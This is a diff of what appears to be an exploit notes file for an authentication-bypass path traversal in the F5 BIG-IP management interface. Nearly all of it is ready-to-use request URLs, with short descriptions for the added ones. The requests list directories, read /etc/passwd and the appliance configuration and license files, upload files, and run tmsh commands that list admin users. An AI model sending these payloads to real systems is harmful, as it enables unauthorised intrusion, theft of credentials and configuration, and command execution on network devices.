@@ -21,4 +21,26 @@ https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/
 https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
 https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
 https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
+directoryList
 
+List files within a folder specified through the directoryPath URL parameter
+
+https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp/
+
+fileRead
+
+Read a file content specified through the fileName URL parameter
+
+https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+
+fileSave
+
+Upload a file specified through the fileName URL parameter and content of the file specified through the content URL parameter, using POST method.
+
+https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&content=test
+
+tmshCmd
+
+Execute predefined (based on their documentation) system commands through the command URL parameter
+
+https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user
